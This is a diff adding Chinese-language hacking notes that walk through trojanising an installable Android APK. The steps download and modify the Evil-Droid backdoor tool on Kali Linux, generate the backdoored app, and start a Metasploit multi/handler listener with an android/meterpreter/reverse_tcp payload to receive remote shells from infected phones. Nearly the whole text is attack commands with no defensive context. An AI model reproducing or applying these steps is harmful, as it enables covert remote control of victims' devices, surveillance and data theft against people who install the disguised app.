@@ -15,5 +15,61 @@ msf6 exploit(multi/handler) > set LHOST 10.211.55.6
 msf6 exploit(multi/handler) > run
 
 
-#############挂
-木马
+#############
+挂木马到能安装的apk
+
+禁用IPv6
+┌──(root💀kali-linux-2021-3)-[~]
+└─# echo "net.ipv6.conf.eth0.disable_ipv6 = 1" >> /etc/sysctl.conf 
+                                                                                                                                             
+┌──(root💀kali-linux-2021-3)-[~]
+└─# sysctl -p                  
+net.ipv6.conf.eth0.disable_ipv6 = 1
+                                                                                                                                             
+┌──(root💀kali-linux-2021-3)-[~]
+└─# ifconfig
+
+下载插件
+┌──(root💀kali-linux-2021-3)-[~]
+└─# wget https://codeload.github.com/M4sc3r4n0/Evil-Droid/zip/master
+
+解压master
+┌──(root💀kali-linux-2021-3)-[~]
+└─# unzip master 
+
+┌──(root💀kali-linux-2021-3)-[~]
+└─# cd Evil-Droid-master 
+vim Evil-Droid-master
+40gg
+google.com 改为 baidu.com
+649gg
+-fa monaco 删掉
+┌──(root💀kali-linux-2021-3)-[~/Evil-Droid-master]
+└─# chmod +x evil-droid 
+
+┌──(root💀kali-linux-2021-3)-[~/Evil-Droid-master]
+└─# ./evil-droid 
+可视化执行，装后门
+
+生成apk在此处
+┌──(root💀kali-linux-2021-3)-[~/Evil-Droid-master/evilapk]
+└─# pwd      
+/root/Evil-Droid-master/evilapk
+
+
+#####开启监听
+msf6 > use exploit/multi/handler 
+msf6 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > show options
+msf6 exploit(multi/handler) > set LHOST 10.211.55.6
+msf6 exploit(multi/handler) > run
+
+
+
+
+
+
+
+
+
+
